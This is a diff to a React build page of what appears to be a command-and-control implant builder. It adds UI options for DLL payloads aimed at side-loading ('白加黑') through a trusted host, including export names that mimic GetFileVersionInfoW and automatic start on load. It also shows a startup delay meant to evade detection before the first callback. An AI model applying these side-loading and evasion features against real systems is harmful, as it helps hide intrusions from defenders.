@@ -267,6 +267,9 @@ export function Builds() {
     bof_enabled: false,
     // 代码签名：证书在服务端配置，这里只决定本次构不签
     sign_enabled: false,
+    // DLL 载荷：导出名（rundll32 用）与"加载即启动"（白加黑用）
+    dll_export: '',
+    dll_autostart: true,
     // 启动随机延迟：默认沿用服务端配置（implant.startup_delay_min/max）
     startup_delay_min: 0,
     startup_delay_max: 0,
@@ -1144,10 +1147,48 @@ export function Builds() {
                   </div>
                 </div>
 
+                {formData.format === 'dll' && (
+                  <div className="evasion-toggle-row">
+                    <div className="toggle-group">
+                      <label className="toggle-label"><span>DLL 载荷（白加黑 / rundll32）</span></label>
+                      <p className="form-hint">
+                        {builderInfo?.evasion?.dll_message ||
+                          'DLL 需要与目标架构一致的 mingw-w64 gcc（x64 需 x86_64-w64-mingw32-gcc）'}
+                      </p>
+                      <div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginTop: '8px', flexWrap: 'wrap' }}>
+                        <div className="form-group" style={{ margin: 0 }}>
+                          <label>导出函数名</label>
+                          <input
+                            type="text"
+                            name="dll_export"
+                            value={formData.dll_export ?? ''}
+                            onChange={handleInputChange}
+                            placeholder="Start（rundll32 payload.dll,Start）"
+                          />
+                        </div>
+                        <label className="toggle-label" style={{ marginTop: 18 }}>
+                          <input
+                            type="checkbox"
+                            name="dll_autostart"
+                            checked={formData.dll_autostart !== false}
+                            onChange={handleInputChange}
+                          />
+                          <span>DLL 加载即启动</span>
+                        </label>
+                      </div>
+                      <p className="form-hint">
+                        白加黑场景宿主不一定调用我们的导出函数，所以默认<strong>加载即启动</strong>；
+                        需要宿主控制时机时取消勾选。导出名可以填成宿主期望的名字（例如
+                        <code>GetFileVersionInfoW</code>）——服务端用 C 侧 __stdcall 包装导出，
+                        不会和系统声明冲突（386 上也会剥掉 @16 修饰）。
+                      </p>
+                    </div>
+                  </div>
+                )}
+
                 <div className="evasion-toggle-row">
                   <div className="toggle-group">
-                    <label className="toggle-label"><span>启动随机延迟 (秒)</span></label>
-                    <p className="form-hint">
+                    <label className="toggle-label"><span>启动随机延迟 (秒)</span></label>                    <p className="form-hint">
                       载荷启动后随机休眠 [最小, 最大] 秒再首次回连，打乱"启动即行为"的
                       检测节奏。留 0 使用服务端配置（implant.startup_delay_min/max）。
                     </p>
